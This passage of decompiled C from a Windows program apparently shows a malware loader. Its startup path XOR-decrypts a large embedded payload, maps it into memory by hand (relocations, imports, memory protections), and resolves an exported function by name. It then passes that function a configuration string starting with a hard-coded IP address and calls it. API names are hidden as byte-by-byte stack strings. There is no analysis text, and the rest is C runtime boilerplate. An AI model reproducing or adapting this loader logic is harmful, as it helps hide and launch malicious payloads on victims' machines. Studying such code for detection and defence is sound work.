  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20 [4];
  FARPROC local_1c;
  int local_18;
  FARPROC local_14;
  int local_10;
  uint *local_c;
  uint local_8;
  
  local_3c = 'K';
  local_3b = 0x45;
  local_3a = 0x52;
  local_39 = 0x4e;
  local_38 = 0x45;
  local_37 = 0x4c;
  local_36 = 0x33;
  local_35 = 0x32;
  local_34 = 0x2e;
  local_33 = 100;
  local_32 = 0x6c;
  local_31 = 0x6c;
  local_30 = 0;
  local_2c = 'V';
  local_2b = 0x69;
  local_2a = 0x72;
  local_29 = 0x74;
  local_28 = 0x75;
  local_27 = 0x61;
  local_26 = 0x6c;
  local_25 = 0x46;
  local_24 = 0x72;
  local_23 = 0x65;
  local_22 = 0x65;
  local_21 = 0;
  local_14 = FUN_0045a8c0((HMODULE)0x0,&local_3c,&local_2c);
  local_4c = 'V';
  local_4b = 0x69;
  local_4a = 0x72;
  local_49 = 0x74;
  local_48 = 0x75;
  local_47 = 0x61;
  local_46 = 0x6c;
  local_45 = 0x50;
  local_44 = 0x72;
  local_43 = 0x6f;
  local_42 = 0x74;
  local_41 = 0x65;
  local_40 = 99;
  local_3f = 0x74;
  local_3e = 0;
  local_1c = FUN_0045a8c0((HMODULE)0x0,&local_3c,&local_4c);
  local_10 = 0;
  iVar1 = *param_1;
  if (*(short *)(iVar1 + 6) != 0) {
    local_c = (uint *)((uint)*(ushort *)(iVar1 + 0x14) + iVar1 + 0x3c);
    do {
      local_8 = *local_c;
      local_18 = -((int)local_8 >> 0x1f);
      if ((local_8 & 0x2000000) == 0) {
        uVar2 = *(uint *)(&DAT_004570f0 +
                         (local_18 + ((local_8 >> 0x1e & 1) + (local_8 >> 0x1d & 1) * 2) * 2) * 4);
        if ((local_8 & 0x4000000) != 0) {
          uVar2 = uVar2 | 0x200;
        }
        bVar3 = local_c[-5] == 0;
        if (bVar3) {
          if ((local_8 & 0x40) == 0) {
            if ((local_8 & 0x80) == 0) goto LAB_0045b01d;
            iVar1 = *(int *)(iVar1 + 0x24);
          }
          else {
            iVar1 = *(int *)(iVar1 + 0x20);
          }
          bVar3 = iVar1 == 0;
        }
        if (!bVar3) {
          (*local_1c)(local_c[-7],local_c[-5],uVar2,local_20);
        }
      }
      else {
        (*local_14)(local_c[-7],local_c[-5],0x4000);
      }
LAB_0045b01d:
      local_10 = local_10 + 1;
      local_c = local_c + 10;
      iVar1 = *param_1;
    } while (local_10 < (int)(uint)*(ushort *)(iVar1 + 6));
  }
  return;
}



void __cdecl FUN_0045b03d(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xa4) != 0) {
    piVar3 = (int *)(*(int *)(*param_1 + 0xa0) + iVar1);
    iVar2 = *piVar3;
    while (iVar2 != 0) {
      param_1 = (int *)0x0;
      piVar5 = piVar3 + 2;
      if ((piVar3[1] - 8U & 0xfffffffe) != 0) {
        do {
          if ((*(ushort *)piVar5 & 0xf000) == 0x3000) {
            piVar4 = (int *)((*(ushort *)piVar5 & 0xfff) + iVar2 + iVar1);
            *piVar4 = *piVar4 + param_2;
          }
          param_1 = (int *)((int)param_1 + 1);
          piVar5 = (int *)((int)piVar5 + 2);
        } while (param_1 < (int *)(piVar3[1] - 8U >> 1));
      }
      piVar3 = (int *)((int)piVar3 + piVar3[1]);
      iVar2 = *piVar3;
    }
  }
  return;
}



int __cdecl FUN_0045b0b7(FARPROC *param_1)

{
  FARPROC *ppFVar1;
  int iVar2;
  FARPROC pFVar3;
  code *lpProcName;
  FARPROC pFVar4;
  int *piVar5;
  FARPROC *ppFVar6;
  CHAR local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  CHAR local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  undefined local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  CHAR local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  FARPROC local_18;
  FARPROC local_14;
  HMODULE local_10;
  FARPROC local_c;
  int local_8;
  
  ppFVar1 = param_1;
  local_1c = 0;
  local_2c = 0;
  local_28 = 'K';
  local_27 = 0x45;
  local_26 = 0x52;
  local_25 = 0x4e;
  local_24 = 0x45;
  local_23 = 0x4c;
  local_22 = 0x33;
  local_21 = 0x32;
  local_20 = 0x2e;
  local_1f = 100;
  local_1e = 0x6c;
  local_1d = 0x6c;
  local_38 = 'I';
  local_37 = 0x73;
  local_36 = 0x42;
  local_35 = 0x61;
  local_34 = 100;
  local_33 = 0x52;
  local_32 = 0x65;
  local_31 = 0x61;
  local_30 = 100;
  local_2f = 0x50;
  local_2e = 0x74;
  local_2d = 0x72;
  local_14 = FUN_0045a8c0((HMODULE)0x0,&local_28,&local_38);
  local_3c = 0;
  local_48 = 'L';
  local_47 = 0x6f;
  local_46 = 0x61;
  local_45 = 100;
  local_44 = 0x4c;
  local_43 = 0x69;
  local_42 = 0x62;
  local_41 = 0x72;
  local_40 = 0x61;
  local_3f = 0x72;
  local_3e = 0x79;
  local_3d = 0x41;
  local_18 = FUN_0045a8c0((HMODULE)0x0,&local_28,&local_48);
  local_8 = 1;
  pFVar4 = param_1[1];
  if (*(int *)(*param_1 + 0x84) != 0) {
    piVar5 = (int *)(pFVar4 + *(int *)(*param_1 + 0x80));
    local_c = pFVar4;
    iVar2 = (*local_14)(piVar5,0x14);
    while( true ) {
      if (iVar2 != 0) {
        return local_8;
      }
      if (piVar5[3] == 0) {
        return local_8;
      }
      local_10 = (HMODULE)(*local_18)(pFVar4 + piVar5[3]);
      if (local_10 == (HMODULE)0xffffffff) break;
      pFVar3 = (FARPROC)FUN_0045a97b((int)ppFVar1[2],(int)ppFVar1[3] * 4 + 4);
      ppFVar1[2] = pFVar3;
      if (pFVar3 == (FARPROC)0x0) break;
      *(HMODULE *)(pFVar3 + (int)ppFVar1[3] * 4) = local_10;
      ppFVar1[3] = ppFVar1[3] + 1;
      if (*piVar5 == 0) {
        ppFVar6 = (FARPROC *)(pFVar4 + piVar5[4]);
        param_1 = ppFVar6;
      }
      else {
        ppFVar6 = (FARPROC *)(local_c + piVar5[4]);
        param_1 = (FARPROC *)(pFVar4 + *piVar5);
      }
      for (; pFVar4 = *param_1, pFVar4 != (FARPROC)0x0; param_1 = param_1 + 1) {
        if (((uint)pFVar4 & 0x80000000) == 0) {
          lpProcName = pFVar4 + (int)local_c + 2;
        }
        else {
          lpProcName = (code *)((uint)pFVar4 & 0xffff);
        }
        pFVar4 = GetProcAddress(local_10,(LPCSTR)lpProcName);
        *ppFVar6 = pFVar4;
        if (pFVar4 == (FARPROC)0x0) {
          local_8 = 0;
          break;
        }
        ppFVar6 = ppFVar6 + 1;
      }
      if (local_8 == 0) {
        return 0;
      }
      piVar5 = piVar5 + 5;
      iVar2 = (*local_14)(piVar5,0x14);
      pFVar4 = local_c;
    }
    local_8 = 0;
  }
  return local_8;
}



int __cdecl FUN_0045b27a(int *param_1,byte *param_2)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  ushort *puVar4;
  uint uVar5;
  int iVar6;
  byte *pbVar7;
  int *piVar8;
  bool bVar9;
  uint local_8;
  
  iVar2 = param_1[1];
  if (*(int *)(*param_1 + 0x7c) != 0) {
    iVar3 = *(int *)(*param_1 + 0x78) + iVar2;
    if ((*(int *)(iVar3 + 0x18) != 0) && (*(int *)(iVar3 + 0x14) != 0)) {
      local_8 = 0;
      piVar8 = (int *)(*(int *)(iVar3 + 0x20) + iVar2);
      puVar4 = (ushort *)(*(int *)(iVar3 + 0x24) + iVar2);
      if (*(int *)(iVar3 + 0x18) != 0) {
        do {
          pbVar7 = (byte *)(*piVar8 + iVar2);
          param_1 = (int *)param_2;
          do {
            bVar1 = *(byte *)param_1;
            bVar9 = bVar1 < *pbVar7;
            if (bVar1 != *pbVar7) {
LAB_0045b2f2:
              iVar6 = (1 - (uint)bVar9) - (uint)(bVar9 != 0);
              goto LAB_0045b2f7;
            }
            if (bVar1 == 0) break;
            bVar1 = *(byte *)((int)param_1 + 1);
            bVar9 = bVar1 < pbVar7[1];
            if (bVar1 != pbVar7[1]) goto LAB_0045b2f2;
            param_1 = (int *)((int)param_1 + 2);
            pbVar7 = pbVar7 + 2;
          } while (bVar1 != 0);
          iVar6 = 0;
LAB_0045b2f7:
          if (iVar6 == 0) {
            uVar5 = (uint)*puVar4;
            if (uVar5 == 0xffffffff) {
              return 0;
            }
            if (*(uint *)(iVar3 + 0x14) < uVar5) {
              return 0;
            }
            return *(int *)(*(int *)(iVar3 + 0x1c) + uVar5 * 4 + iVar2) + iVar2;
          }
          local_8 = local_8 + 1;
          piVar8 = piVar8 + 1;
          puVar4 = puVar4 + 1;
        } while (local_8 < *(uint *)(iVar3 + 0x18));
      }
    }
  }
  return 0;
}



void __cdecl FUN_0045b32f(int *param_1)

{
  int iVar1;
  int iVar2;
  CHAR local_58;
  undefined local_57;
  undefined local_56;
  undefined local_55;
  undefined local_54;
  undefined local_53;
  undefined local_52;
  undefined local_51;
  undefined local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_4c;
  undefined local_4b;
  undefined local_4a;
  CHAR local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  CHAR local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  undefined local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  CHAR local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  CHAR local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  FARPROC local_14;
  FARPROC local_10;
  FARPROC local_c;
  FARPROC local_8;
  
  local_48 = 'K';
  local_47 = 0x45;
  local_46 = 0x52;
  local_45 = 0x4e;
  local_44 = 0x45;
  local_43 = 0x4c;
  local_42 = 0x33;
  local_41 = 0x32;
  local_40 = 0x2e;
  local_3f = 100;
  local_3e = 0x6c;
  local_3d = 0x6c;
  local_3c = 0;
  local_2c = 'F';
  local_2b = 0x72;
  local_2a = 0x65;
  local_29 = 0x65;
  local_28 = 0x4c;
  local_27 = 0x69;
  local_26 = 0x62;
  local_25 = 0x72;
  local_24 = 0x61;
  local_23 = 0x72;
  local_22 = 0x79;
  local_21 = 0;
  local_8 = FUN_0045a8c0((HMODULE)0x0,&local_48,&local_2c);
  local_38 = 'V';
  local_37 = 0x69;
  local_36 = 0x72;
  local_35 = 0x74;
  local_34 = 0x75;
  local_33 = 0x61;
  local_32 = 0x6c;
  local_31 = 0x46;
  local_30 = 0x72;
  local_2f = 0x65;
  local_2e = 0x65;
  local_2d = 0;
  local_c = FUN_0045a8c0((HMODULE)0x0,&local_48,&local_38);
  local_58 = 'G';
  local_57 = 0x65;
  local_56 = 0x74;
  local_55 = 0x50;
  local_54 = 0x72;
  local_53 = 0x6f;
  local_52 = 99;
  local_51 = 0x65;
  local_50 = 0x73;
  local_4f = 0x73;
  local_4e = 0x48;
  local_4d = 0x65;
  local_4c = 0x61;
  local_4b = 0x70;
  local_4a = 0;
  local_10 = FUN_0045a8c0((HMODULE)0x0,&local_48,&local_58);
  local_20 = 'H';
  local_1f = 0x65;
  local_1e = 0x61;
  local_1d = 0x70;
  local_1c = 0x46;
  local_1b = 0x72;
  local_1a = 0x65;
  local_19 = 0x65;
  local_18 = 0;
  local_14 = FUN_0045a8c0((HMODULE)0x0,&local_48,&local_20);
  if (param_1 != (int *)0x0) {
    if (param_1[4] != 0) {
      (*(code *)(*(int *)(*param_1 + 0x28) + param_1[1]))(param_1[1],0,0);
      param_1[4] = 0;
    }
    if (param_1[2] != 0) {
      iVar2 = 0;
      if (0 < param_1[3]) {
        do {
          iVar1 = *(int *)(param_1[2] + iVar2 * 4);
          if (iVar1 != -1) {
            (*local_8)(iVar1);
          }
          iVar2 = iVar2 + 1;
        } while (iVar2 < param_1[3]);
      }
      FUN_0045aa9d(param_1[2]);
    }
    if (param_1[1] != 0) {
      (*local_c)(param_1[1],0,0x8000);
    }
    iVar2 = (*local_10)(0,param_1);
    (*local_14)(iVar2);
  }
  return;
}



void __cdecl FUN_0045b4d7(int param_1,int param_2,int param_3)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  iVar1 = 0;
  if (0 < param_2) {
    do {
      *(byte *)(iVar1 + param_1) =
           *(byte *)(iVar1 + param_1) ^ (char)((int)*(char *)(iVar2 + param_3) % 0x6d9) + 0x4fU;
      iVar2 = iVar2 + 1;
      if (iVar1 % 5 == 0) {
        iVar2 = 0;
      }
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_2);
  }
  return;
}



void __thiscall FUN_0045b51a(void *this,byte *param_1)

{
  FARPROC *ppFVar1;
  code *pcVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 auStackY_860 [525];
  undefined4 uStackY_2c;
  undefined4 local_c;
  undefined4 local_8;
  
  local_c = 0x52cf16be;
  local_8 = CONCAT31((int3)((uint)this >> 8),0xcd);
  FUN_0045b4d7(0x4010f0,0x56000,(int)&local_c);
  uStackY_2c = 0x45b550;
  ppFVar1 = FUN_0045ab6a((undefined4 *)&DAT_004010f0);
  if (ppFVar1 != (FARPROC *)0x0) {
    pcVar2 = (code *)FUN_0045b27a((int *)ppFVar1,param_1);
    if (pcVar2 != (code *)0x0) {
      puVar4 = (undefined4 *)s_103_39_230_188_00457118;
      puVar5 = auStackY_860;
      for (iVar3 = 0x212; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar5 = *puVar4;
        puVar4 = puVar4 + 1;
        puVar5 = puVar5 + 1;
      }
      (*pcVar2)();
    }
    FUN_0045b32f((int *)ppFVar1);
  }
  return;
}



void __fastcall FUN_0045b58a(void *param_1)

{
  FUN_0045b51a(param_1,&DAT_00457110);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  DWORD DVar1;
  int iVar2;
  UINT UVar3;
  void *extraout_ECX;
  undefined4 *unaff_FS_OFFSET;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  _EXCEPTION_POINTERS *local_18;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a378;
  puStack_10 = &LAB_0045c368;
  uStack_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_14;
  local_1c = &stack0xffffff88;
  DVar1 = GetVersion();
  _DAT_0045f4ac = DVar1 >> 8 & 0xff;
  _DAT_0045f4a8 = DVar1 & 0xff;
  _DAT_0045f4a4 = _DAT_0045f4a8 * 0x100 + _DAT_0045f4ac;
  _DAT_0045f4a0 = DVar1 >> 0x10;
  iVar2 = FUN_0045c210(1);
  if (iVar2 == 0) {
    FUN_0045b6c5(0x1c);
  }
  iVar2 = FUN_0045bfcd();
  if (iVar2 == 0) {
    FUN_0045b6c5(0x10);
  }
  local_8 = 0;
  FUN_0045be11();
  DAT_0045fb58 = GetCommandLineA();
  DAT_0045f490 = FUN_0045bcdf();
  FUN_0045ba92();
  FUN_0045b9d9();
  FUN_0045b6e9();
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  FUN_0045b981();
  GetModuleHandleA((LPCSTR)0x0);
  UVar3 = FUN_0045b58a(extraout_ECX);
  FUN_0045b716(UVar3);
  FUN_0045b809(local_18->ExceptionRecord->ExceptionCode,local_18);
  return;
}



void __cdecl FUN_0045b6a0(DWORD param_1)

{
  if (DAT_0045f498 == 1) {
    FUN_0045c440();
  }
  FUN_0045c479(param_1);
  (*(code *)PTR_FUN_00457960)(0xff);
  return;
}



void __cdecl FUN_0045b6c5(DWORD param_1)

{
  if (DAT_0045f498 == 1) {
    FUN_0045c440();
  }
  FUN_0045c479(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(0xff);
}



void FUN_0045b6e9(void)

{
  if (DAT_0045fb54 != (code *)0x0) {
    (*DAT_0045fb54)();
  }
  FUN_0045b7ef((undefined **)&DAT_004010d0,(undefined **)&DAT_004010d8);
  FUN_0045b7ef((undefined **)&DAT_004010c8,(undefined **)&DAT_004010cc);
  return;
}



void __cdecl FUN_0045b716(UINT param_1)

{
  FUN_0045b738(param_1,0,0);
  return;
}



void FUN_0045b727(UINT param_1)

{
  FUN_0045b738(param_1,1,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0045b738(UINT param_1,int param_2,int param_3)

{
  HANDLE hProcess;
  code **ppcVar1;
  UINT uExitCode;
  
  FUN_0045b7dd();
  if (DAT_0045f4dc == 1) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  _DAT_0045f4d8 = 1;
  DAT_0045f4d4 = (undefined)param_3;
  if (param_2 == 0) {
    if ((DAT_0045fb50 != (code **)0x0) &&
       (ppcVar1 = (code **)(DAT_0045fb4c - 4), DAT_0045fb50 <= ppcVar1)) {
      do {
        if (*ppcVar1 != (code *)0x0) {
          (**ppcVar1)();
        }
        ppcVar1 = ppcVar1 + -1;
      } while (DAT_0045fb50 <= ppcVar1);
    }
    FUN_0045b7ef((undefined **)&DAT_004010dc,(undefined **)&DAT_004010e0);
  }
  FUN_0045b7ef((undefined **)&DAT_004010e4,(undefined **)&DAT_004010e8);
  if (param_3 == 0) {
    DAT_0045f4dc = 1;
                    // WARNING: Subroutine does not return
    ExitProcess(param_1);
  }
  FUN_0045b7e6();
  return;
}



void FUN_0045b7dd(void)

{
  FUN_0045c5f5(0xd);
  return;
}



void FUN_0045b7e6(void)

{
  FUN_0045c656(0xd);
  return;
}



void __cdecl FUN_0045b7ef(undefined **param_1,undefined **param_2)

{
  for (; param_1 < param_2; param_1 = (code **)param_1 + 1) {
    if ((code *)*param_1 != (code *)0x0) {
      (*(code *)*param_1)();
    }
  }
  return;
}



LONG __cdecl FUN_0045b809(int param_1,_EXCEPTION_POINTERS *param_2)

{
  code *pcVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  int *piVar5;
  LONG LVar6;
  int iVar7;
  int iVar8;
  
  puVar4 = FUN_0045c034();
  piVar5 = FUN_0045b947(param_1,(int *)puVar4[0x14]);
  if ((piVar5 == (int *)0x0) || (pcVar1 = (code *)piVar5[2], pcVar1 == (code *)0x0)) {
    LVar6 = UnhandledExceptionFilter(param_2);
  }
  else if (pcVar1 == (code *)0x5) {
    piVar5[2] = 0;
    LVar6 = 1;
  }
  else {
    if (pcVar1 != (code *)0x1) {
      uVar2 = puVar4[0x15];
      puVar4[0x15] = (uint)param_2;
      if (piVar5[1] == 8) {
        if (DAT_004579e0 < DAT_004579e4 + DAT_004579e0) {
          iVar7 = DAT_004579e0 * 0xc;
          iVar8 = DAT_004579e0;
          do {
            *(undefined4 *)(iVar7 + 8 + puVar4[0x14]) = 0;
            iVar8 = iVar8 + 1;
            iVar7 = iVar7 + 0xc;
          } while (iVar8 < DAT_004579e4 + DAT_004579e0);
        }
        iVar7 = *piVar5;
        uVar3 = puVar4[0x16];
        if (iVar7 == -0x3fffff72) {
          puVar4[0x16] = 0x83;
        }
        else if (iVar7 == -0x3fffff70) {
          puVar4[0x16] = 0x81;
        }
        else if (iVar7 == -0x3fffff6f) {
          puVar4[0x16] = 0x84;
        }
        else if (iVar7 == -0x3fffff6d) {
          puVar4[0x16] = 0x85;
        }
        else if (iVar7 == -0x3fffff73) {
          puVar4[0x16] = 0x82;
        }
        else if (iVar7 == -0x3fffff71) {
          puVar4[0x16] = 0x86;
        }
        else if (iVar7 == -0x3fffff6e) {
          puVar4[0x16] = 0x8a;
        }
        (*pcVar1)(8,puVar4[0x16]);
        puVar4[0x16] = uVar3;
      }
      else {
        piVar5[2] = 0;
        (*pcVar1)(piVar5[1]);
      }
      puVar4[0x15] = uVar2;
    }
    LVar6 = -1;
  }
  return LVar6;
}



int * __cdecl FUN_0045b947(int param_1,int *param_2)

{
  int *piVar1;
  
  piVar1 = param_2;
  if (*param_2 != param_1) {
    do {
      piVar1 = piVar1 + 3;
      if (param_2 + DAT_004579ec * 3 <= piVar1) break;
    } while (*piVar1 != param_1);
  }
  if ((param_2 + DAT_004579ec * 3 <= piVar1) || (*piVar1 != param_1)) {
    piVar1 = (int *)0x0;
  }
  return piVar1;
}



byte * FUN_0045b981(void)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  byte *pbVar4;
  
  if (DAT_0045fb48 == 0) {
    FUN_0045ca85();
  }
  bVar1 = *DAT_0045fb58;
  pbVar4 = DAT_0045fb58;
  if (bVar1 == 0x22) {
    while( true ) {
      pbVar3 = pbVar4;
      bVar1 = pbVar3[1];
      pbVar4 = pbVar3 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      iVar2 = FUN_0045c66b(bVar1);
      if (iVar2 != 0) {
        pbVar4 = pbVar3 + 2;
      }
    }
    if (*pbVar4 == 0x22) goto LAB_0045b9be;
  }
  else {
    while (0x20 < bVar1) {
      bVar1 = pbVar4[1];
      pbVar4 = pbVar4 + 1;
    }
  }
  for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
LAB_0045b9be:
  }
  return pbVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0045b9d9(void)

{
  char cVar1;
  char *pcVar2;
  uint **ppuVar3;
  uint *puVar4;
  int iVar5;
  uint *puVar6;
  
  if (DAT_0045fb48 == 0) {
    FUN_0045ca85();
  }
  iVar5 = 0;
  for (puVar6 = DAT_0045f490; *(char *)puVar6 != '\0'; puVar6 = (uint *)(pcVar2 + (int)puVar6 + 1))
  {
    if (*(char *)puVar6 != '=') {
      iVar5 = iVar5 + 1;
    }
    pcVar2 = FUN_0045cdc0(puVar6);
  }
  ppuVar3 = (uint **)FUN_0045cc80((uint *)(iVar5 * 4 + 4));
  _DAT_0045f4bc = ppuVar3;
  if (ppuVar3 == (uint **)0x0) {
    FUN_0045b6a0(9);
  }
  cVar1 = *(char *)DAT_0045f490;
  puVar6 = DAT_0045f490;
  while (cVar1 != '\0') {
    pcVar2 = FUN_0045cdc0(puVar6);
    if (*(char *)puVar6 != '=') {
      puVar4 = (uint *)FUN_0045cc80((uint *)(pcVar2 + 1));
      *ppuVar3 = puVar4;
      if (puVar4 == (uint *)0x0) {
        FUN_0045b6a0(9);
      }
      FUN_0045cb90(*ppuVar3,puVar6);
      ppuVar3 = ppuVar3 + 1;
    }
    puVar6 = (uint *)((int)puVar6 + (int)(pcVar2 + 1));
    cVar1 = *(char *)puVar6;
  }
  FUN_0045caa1((undefined *)DAT_0045f490);
  DAT_0045f490 = (uint *)0x0;
  *ppuVar3 = (uint *)0x0;
  _DAT_0045fb44 = 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0045ba92(void)

{
  byte **ppbVar1;
  byte *pbVar2;
  int local_c;
  int local_8;
  
  if (DAT_0045fb48 == 0) {
    FUN_0045ca85();
  }
  GetModuleFileNameA((HMODULE)0x0,&DAT_0045f4e0,0x104);
  _DAT_0045f4cc = &DAT_0045f4e0;
  pbVar2 = &DAT_0045f4e0;
  if (*DAT_0045fb58 != 0) {
    pbVar2 = DAT_0045fb58;
  }
  FUN_0045bb2b(pbVar2,(byte **)0x0,(byte *)0x0,&local_8,&local_c);
  ppbVar1 = (byte **)FUN_0045cc80((uint *)(local_c + local_8 * 4));
  if (ppbVar1 == (byte **)0x0) {
    FUN_0045b6a0(8);
  }
  FUN_0045bb2b(pbVar2,ppbVar1,(byte *)(ppbVar1 + local_8),&local_8,&local_c);
  _DAT_0045f4b4 = ppbVar1;
  _DAT_0045f4b0 = local_8 + -1;
  return;
}



void __cdecl FUN_0045bb2b(byte *param_1,byte **param_2,byte *param_3,int *param_4,int *param_5)

{
  byte bVar1;
  bool bVar2;
  bool bVar3;
  byte *pbVar4;
  byte *pbVar5;
  uint uVar6;
  byte **ppbVar7;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (byte **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == 0x22) {
    while( true ) {
      bVar1 = param_1[1];
      pbVar4 = param_1 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      if ((((&DAT_0045f921)[bVar1] & 4) != 0) && (*param_5 = *param_5 + 1, param_3 != (byte *)0x0))
      {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
        pbVar4 = param_1 + 2;
      }
      *param_5 = *param_5 + 1;
      param_1 = pbVar4;
      if (param_3 != (byte *)0x0) {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
      }
    }
    *param_5 = *param_5 + 1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    if (*pbVar4 == 0x22) {
      pbVar4 = param_1 + 2;
    }
  }
  else {
    do {
      *param_5 = *param_5 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      bVar1 = *param_1;
      pbVar4 = param_1 + 1;
      if (((&DAT_0045f921)[bVar1] & 4) != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (byte *)0x0) {
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        pbVar4 = param_1 + 2;
      }
      if (bVar1 == 0x20) break;
      if (bVar1 == 0) goto LAB_0045bbd6;
      param_1 = pbVar4;
    } while (bVar1 != 9);
    if (bVar1 == 0) {
LAB_0045bbd6:
      pbVar4 = pbVar4 + -1;
    }
    else if (param_3 != (byte *)0x0) {
      param_3[-1] = 0;
    }
  }
  bVar2 = false;
  ppbVar7 = param_2;
  while (*pbVar4 != 0) {
    for (; (*pbVar4 == 0x20 || (*pbVar4 == 9)); pbVar4 = pbVar4 + 1) {
    }
    if (*pbVar4 == 0) break;
    if (ppbVar7 != (byte **)0x0) {
      *ppbVar7 = param_3;
      ppbVar7 = ppbVar7 + 1;
      param_2 = ppbVar7;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar3 = true;
      uVar6 = 0;
      for (; *pbVar4 == 0x5c; pbVar4 = pbVar4 + 1) {
        uVar6 = uVar6 + 1;
      }
      if (*pbVar4 == 0x22) {
        pbVar5 = pbVar4;
        if ((uVar6 & 1) == 0) {
          if ((!bVar2) || (pbVar5 = pbVar4 + 1, pbVar4[1] != 0x22)) {
            bVar3 = false;
            pbVar5 = pbVar4;
          }
          bVar2 = !bVar2;
          ppbVar7 = param_2;
        }
        uVar6 = uVar6 >> 1;
        pbVar4 = pbVar5;
      }
      for (; uVar6 != 0; uVar6 = uVar6 - 1) {
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      bVar1 = *pbVar4;
      if ((bVar1 == 0) || ((!bVar2 && ((bVar1 == 0x20 || (bVar1 == 9)))))) break;
      if (bVar3) {
        if (param_3 == (byte *)0x0) {
          if (((&DAT_0045f921)[bVar1] & 4) != 0) {
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
        }
        else {
          if (((&DAT_0045f921)[bVar1] & 4) != 0) {
            *param_3 = bVar1;
            param_3 = param_3 + 1;
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      pbVar4 = pbVar4 + 1;
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (ppbVar7 != (byte **)0x0) {
    *ppbVar7 = (byte *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



undefined4 * FUN_0045bcdf(void)

{
  char cVar1;
  WCHAR WVar2;
  WCHAR *pWVar3;
  WCHAR *pWVar4;
  int iVar5;
  uint *puVar6;
  undefined4 *puVar7;
  LPWCH lpWideCharStr;
  undefined4 *puVar9;
  undefined4 *local_8;
  undefined4 *puVar8;
  
  lpWideCharStr = (LPWCH)0x0;
  puVar9 = (undefined4 *)0x0;
  if (DAT_0045f5e4 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_0045f5e4 = 1;
LAB_0045bd36:
      if ((lpWideCharStr == (LPWCH)0x0) &&
         (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr == (LPWCH)0x0)) {
        return (undefined4 *)0x0;
      }
      WVar2 = *lpWideCharStr;
      pWVar4 = lpWideCharStr;
      while (WVar2 != L'\0') {
        do {
          pWVar3 = pWVar4;
          pWVar4 = pWVar3 + 1;
        } while (*pWVar4 != L'\0');
        pWVar4 = pWVar3 + 2;
        WVar2 = *pWVar4;
      }
